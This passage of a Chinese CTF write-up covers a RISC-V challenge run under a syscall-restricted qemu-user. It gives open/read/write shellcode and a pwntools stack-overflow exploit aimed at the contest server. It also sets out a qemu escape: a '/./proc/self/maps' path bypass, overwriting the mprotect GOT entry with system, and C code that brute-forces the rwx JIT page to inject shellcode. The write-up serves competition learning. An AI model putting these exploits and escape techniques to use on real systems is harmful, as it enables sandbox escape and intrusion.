class="keyword">case</span> TARGET_NR_exit_group:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mprotect:</span></span><br><span class="line"><span class="params">+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span><br><span class="line"><span class="params">+                    arg5, arg6, arg7, arg8);</span></span><br><span class="line"><span class="params">+            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="params">+        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="params">+            <span class="built_in">printf</span>(<span class="string">&quot;[!] %d bad system call\n&quot;</span>, num);</span></span><br><span class="line"><span class="params">+            ret = <span class="number">-1</span>;</span></span><br><span class="line"><span class="params">+            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="params">+    &#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">     <span class="keyword">if</span> (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span></span><br><span class="line"><span class="params">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span></span><br></pre></td></tr></table></figure>

<p>我们看到其只允许调用特定的系统调用，也就是我们只能编写<code>orw shellcode</code>，而程序没有开启<code>pie</code>，也就是栈地址固定不变（需要注意的是本地栈地址和远程不一样，因此需要添加滑板指令，坑死了）。</p>
<p><code>shellcode</code>的编写参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">这里</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">4</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">4</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_openat</span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># read</span></span><br><span class="line">    c.mv a2,a7</span><br><span class="line">    addi a7,a7,<span class="number">7</span></span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># write</span></span><br><span class="line">    li a0, <span class="number">1</span></span><br><span class="line">    addi a7,a7,<span class="number">1</span></span><br><span class="line">    ecall</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10078</span>:    <span class="number">676175b</span>7              lui    a1,<span class="number">0x67617</span></span><br><span class="line"><span class="number">1007</span>c:    c665859b              addiw    a1,a1,<span class="number">-922</span></span><br><span class="line"><span class="number">10080</span>:    <span class="number">00b</span>13223              sd    a1,<span class="number">4</span>(sp)</span><br><span class="line"><span class="number">10084</span>:    <span class="number">004</span>c                  addi    a1,sp,<span class="number">4</span></span><br><span class="line"><span class="number">10086</span>:    f9c00513              li    a0,<span class="number">-100</span></span><br><span class="line"><span class="number">1008</span>a:    <span class="number">4601</span>                  li    a2,<span class="number">0</span></span><br><span class="line"><span class="number">1008</span>c:    <span class="number">03800893</span>              li    a7,<span class="number">56</span></span><br><span class="line"><span class="number">10090</span>:    <span class="number">00000073</span>              ecall</span><br><span class="line"><span class="number">10094</span>:    <span class="number">8646</span>                  mv    a2,a7</span><br><span class="line"><span class="number">10096</span>:    <span class="number">089</span>d                  addi    a7,a7,<span class="number">7</span></span><br><span class="line"><span class="number">10098</span>:    <span class="number">00000073</span>              ecall</span><br><span class="line"><span class="number">1009</span>c:    <span class="number">4505</span>                  li    a0,<span class="number">1</span></span><br><span class="line"><span class="number">1009</span>e:    <span class="number">0885</span>                  addi    a7,a7,<span class="number">1</span></span><br><span class="line"><span class="number">100</span>a0:    <span class="number">00000073</span>              ecall</span><br></pre></td></tr></table></figure>

<p>这里一开始我没有编译环境，因此这里的文件名的输入特别烦人。安装编译环境之后即可以进行编译直接获取<code>shellcode</code>的字节信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-unknown-elf-as orw_flag.<span class="keyword">asm</span> -o orw_flag</span><br><span class="line"># riscv64-unknown-elf-objcopy -S -O binary -j .text orw_flag orw_flag.bin</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">8</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">8</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_open</span><br><span class="line"></span><br><span class="line">    ecall</span><br><span class="line">    c.mv a2,a7</span><br><span class="line">    addi a7,a7,<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    ecall</span><br><span class="line">    li a0, <span class="number">1</span></span><br><span class="line">    addi a7,a7,<span class="number">1</span></span><br><span class="line">    ecall</span><br></pre></td></tr></table></figure>

<p>最终的<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./main&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.28.89.167&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4000800c70</span></span><br><span class="line">nop = p32(<span class="number">0x00000013</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the flag: &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(stack)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">shellcode = nop * <span class="number">0xd0</span></span><br><span class="line">shellcode += p32(<span class="number">0x676175b7</span>) + p32(<span class="number">0xc665859b</span>) + p32(<span class="number">0x00b13223</span>)</span><br><span class="line">shellcode += p16(<span class="number">0x004c</span>) + p32(<span class="number">0xf9c00513</span>) + p16(<span class="number">0x4601</span>)</span><br><span class="line">shellcode += p32(<span class="number">0x03800893</span>) + p32(<span class="number">0x00000073</span>) + p16(<span class="number">0x8646</span>)</span><br><span class="line">shellcode += p16(<span class="number">0x089d</span>) + p32(<span class="number">0x00000073</span>) + p16(<span class="number">0x4505</span>) + p16(<span class="number">0x0885</span>) + p32(<span class="number">0x00000073</span>)</span><br><span class="line"></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里看了大佬的博客，其用到了一种非常稳定的方法做到了任意代码执行，其找到了一段<code>gadget</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00010442</span> <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span></span><br><span class="line"><span class="number">00010446</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010448</span> ef <span class="number">60</span> <span class="number">20</span> <span class="number">61</span>     jal        ra,read                                          </span><br></pre></td></tr></table></figure>

<p>这一段，由于我们可以控制<code>s0,ra</code>寄存器，因此我们可以直接将返回地址覆写为该段代码的起始地址，并将<code>s0</code>设置为<code>bss+0x128</code>这样就可以将<code>a0</code>设置为<code>bss</code>段的地址，就可以向<code>bss</code>中读取任意长度的代码，之后函数返回的时候直接将返回地址设置为<code>bss</code>段的地址，就可以非常稳定的执行代码了，这里不用猜远端的<code>stack</code>地址和添加滑板指令。</p>
<h2 id="Favourite-Architecure-flag2"><a href="#Favourite-Architecure-flag2" class="headerlink" title="Favourite Architecure flag2"></a>Favourite Architecure flag2</h2><p><code>qemu逃逸</code></p>
<p>这里第二个<code>flag:/flag</code>是<code>400</code>权限的，也就是只有<code>root</code>用户可以读，或者运行<code>readflag2</code>这个程序，很明显这里我们直接调用<code>readflag2</code>这个程序。但是栈溢出之后我们虽然做到了任意的代码执行，但是程序给出了系统调用的白名单，因此我们需要利用这些系统调用逃逸出<code>qemu</code>，调用<code>readflag2</code>这个程序。</p>
<p>这里一开始想到的是通过读取<code>/proc/self/maps</code>得到<code>qemu</code>代码段的地址，利用<code>mprotect</code>更改其权限为可写，将<code>patch</code>后的代码改回来，使其可以正常的进行系统调用，但是<code>qemu</code>似乎有特殊的机制，在其内部读取<code>/proc/self/maps</code>的时候只能显示出进程相关的地址，而<code>qmeu</code>的地址无法显示出来，因此无法直接获取得到地址。</p>
<blockquote>
<p>这里之后看了<code>clang</code>大佬的博客，<code>qemu</code>这一部分的源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_openat</span><span class="params">(<span class="type">void</span> *cpu_env, <span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> &#123;</span></span><br><span class="line">     <span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">     <span class="type">int</span> (*fill)(<span class="type">void</span> *cpu_env, <span class="type">int</span> fd);</span><br><span class="line">     <span class="type">int</span> (*cmp)(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2);</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> *<span class="title">fake_open</span>;</span></span><br><span class="line"> <span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fake_open</span> <span class="title">fakes</span>[] =</span> &#123;</span><br><span class="line">     &#123; <span class="string">&quot;maps&quot;</span>, open_self_maps, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;stat&quot;</span>, open_self_stat, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;auxv&quot;</span>, open_self_auxv, is_proc_myself &#125;,</span><br><span class="line">     &#123; <span class="string">&quot;cmdline&quot;</span>, open_self_cmdline, is_proc_myself &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(HOST_WORDS_BIGENDIAN) != defined(TARGET_WORDS_BIGENDIAN)</span></span><br><span class="line">     &#123; <span class="string">&quot;/proc/net/route&quot;</span>, open_net_route, is_proc &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">     &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (is_proc_myself(pathname, <span class="string">&quot;exe&quot;</span>)) &#123;</span><br><span class="line">     <span class="type">int</span> execfd = qemu_getauxval(AT_EXECFD);</span><br><span class="line">     <span class="keyword">return</span> execfd ? execfd : safe_openat(dirfd, exec_path, flags, mode);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (fake_open = fakes; fake_open-&gt;filename; fake_open++) &#123;</span><br><span class="line">     <span class="keyword">if</span> (fake_open-&gt;cmp(pathname, fake_open-&gt;filename)) &#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;	</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_proc_myself</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *entry)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, <span class="string">&quot;/proc/&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;/proc/&quot;</span>))) &#123;</span><br><span class="line">     filename += <span class="built_in">strlen</span>(<span class="string">&quot;/proc/&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, <span class="string">&quot;self/&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;self/&quot;</span>))) &#123;</span><br><span class="line">         filename += <span class="built_in">strlen</span>(<span class="string">&quot;self/&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*filename &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; *filename &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">         <span class="type">char</span> myself[<span class="number">80</span>];</span><br><span class="line">         <span class="built_in">snprintf</span>(myself, <span class="keyword">sizeof</span>(myself), <span class="string">&quot;%d/&quot;</span>, getpid());</span><br><span class="line">         <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(filename, myself, <span class="built_in">strlen</span>(myself))) &#123;</span><br><span class="line">             filename += <span class="built_in">strlen</span>(myself);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, entry)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看函数逻辑，这里只需要绕过<code>is_proc_myself</code>函数的路径判断即可读取全部的内容，这里采用的是路径是<code>/./proc/self/maps</code>。读取路径完毕之后，即获取了<code>glibc</code>的地址和<code>qemu</code>的基址，选择修改<code>mprotect</code>函数的<code>got</code>表为<code>system</code>。</p>
<p>这里的方法其实是有点巧妙的。首先是<code>mprotect(ro_mem, len, 6)</code>即将<code>ro_mem</code>这一段修改为可写属性，之后修改<code>mprotect</code>的<code>got</code>表为<code>system</code>，之后修改<code>ro_mem</code>处为<code>/bin/sh</code>，接着再次调用<code>mprotect(ro_mem, len, 6)</code>即可<code>getshell</code>。</p>
</blockquote>
<p>大佬的<code>wp</code>思路如下，首先在外部看一下<code>vmmap</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwn@eebb5d553168:/$ <span class="built_in">cat</span> /proc/42/maps</span><br><span class="line">00010000-0006c000 r--p 00000000 00:50 8532122                            /home/pwn/main</span><br><span class="line">0006c000-0006f000 rw-p 0005b000 00:50 8532122                            /home/pwn/main</span><br><span class="line">0006f000-00071000 rw-p 00000000 00:00 0</span><br><span class="line">4000000000-4000001000 ---p 00000000 00:00 0</span><br><span class="line">4000001000-4000801000 rw-p 00000000 00:00 0</span><br><span class="line">562f43f38000-562f443a1000 r-xp 00000000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f445a0000-562f445dc000 r--p 00468000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f445dc000-562f44608000 rw-p 004a4000 00:50 8532123                    /home/pwn/qemu-riscv64</span><br><span class="line">562f44608000-562f44625000 rw-p 00000000 00:00 0</span><br><span class="line">562f45060000-562f450e6000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd134000000-7fd13bfff000 rwxp 00000000 00:00 0</span><br><span class="line">7fd13bfff000-7fd13c000000 ---p 00000000 00:00 0</span><br><span class="line">7fd13c000000-7fd13c021000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure>

<p>这里我们看到存在一个<code>rwx</code>的段，即代码可执行。应该是<code>qemu JIT Code</code>的部分，我们将<code>shellcode</code>写入此处，使得<code>qemu</code>执行这一部分的代码。这里和之前的<code>mmap</code>爆破类似，这里我们利用<code>mprotect</code>来爆破得到<code>rwx</code>段的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">test_map</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> inc = <span class="number">0x000004000000</span>; </span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里添加+0x4000即offset的原因是防止破坏原本的jit code</span></span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find: %lx\n&quot;</span>, va);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之所以起始地址设置为<code>va+0x4000</code>是要避开<code>qemu</code>本身的<code>JIT Code</code>。在得到<code>rwx</code>段的地址我们将<code>shellcode</code>写入<code>JIT Code</code>的部分。<code>shellcode</code>是打印出<code>here</code>字符串。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">breakpoint</span><span class="params">()</span> &#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo here shellcode</span></span><br><span class="line"><span class="type">char</span> sc[] = &#123;<span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x5f</span>, <span class="number">0x6a</span>, <span class="number">0x4</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x5d</span>, <span class="number">0x5d</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * VA;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">test_map</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> inc = <span class="number">0x000004000000</span>;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find: %lx\n&quot;</span>, va);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">char</span> *addr;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x90</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">0x10</span>, sc, <span class="built_in">strlen</span>(sc));</span><br><span class="line">    addr = (<span class="type">char</span> *)test_map();</span><br><span class="line">    fflush(<span class="number">0</span>);</span><br><span class="line">    breakpoint();</span><br><span class="line">    <span class="built_in">memcpy</span>(addr, sc, <span class="built_in">strlen</span>(sc));</span><br><span class="line">    <span class="comment">// memset(addr, 0xcc, 100);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后我们编译这段代码，用<code>qemu</code>执行一下。</p>
<h3 id="riscv交叉编译环境搭建"><a href="#riscv交叉编译环境搭建" class="headerlink" title="riscv交叉编译环境搭建"></a>riscv交叉编译环境搭建</h3><p>这里按照<code>github</code>上编译出来的二进制程序存在一定的问题，当我们编译上述代码的时候会报错<code>sys/mman.h</code>找不到。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git build-essential gdb-multiarch gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>静态编译上述的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">riscv64-linux-gnu-gcc -static brute_test.c -o brute_test</span><br></pre></td></tr></table></figure>

<p>使用<code>qemu</code>运行编译好的静态程序。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@1c877093faab:~/work/2020starctf/favourite_architecture<span class="comment"># ./qemu-riscv64 brute_test</span></span><br><span class="line">[!] 80 bad system call</span><br><span class="line">find: 7fc23c000000</span><br><span class="line">[!] 80 bad system call</span><br><span class="line"></span><br><span class="line">hereSegmentation fault</span><br></pre></td></tr></table></figure>

<p>可以看到成功打印出了<code>here</code>字符串，但是这里有一个问题，就是<code>memcpy</code>虽然拷贝的是<code>sc</code>数组中值，但是如果我们将<code>buf</code>删除或者将<code>sc</code>拷贝到<code>buf</code>中的语句删掉执行就不会成功，不知道是什么问题。</p>
<p>这里执行成功之后，我们就可以将<code>shellcode</code>直接覆写到<code>jit code page</code>中。</p>
